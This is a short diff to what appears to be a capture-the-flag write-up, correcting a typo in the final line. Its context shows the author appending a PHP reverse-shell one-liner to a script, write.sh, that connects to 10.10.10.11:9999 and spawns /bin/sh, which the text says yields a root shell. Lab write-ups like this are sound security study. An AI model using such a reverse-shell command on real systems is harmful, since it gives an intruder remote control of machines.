@@ -225,6 +225,6 @@ I open a listener on 9999 and go make a cup of tea.  Black tea.  No sugar, no cr
 I'm so close... well, php worked before, so let's use it again.
 >$ echo "php -r $sock=fsockopen("10.10.10.11",9999);exec("/bin/sh -i <&3 >&3 2>&3");'" >> write.sh
 
-BOOM!  Shell pops, whoami says I'm root.  Collect flag, ganme over.
+BOOM!  Shell pops, whoami says I'm root.  Collect flag, game over.
 
 What other ways could I have gotten root?
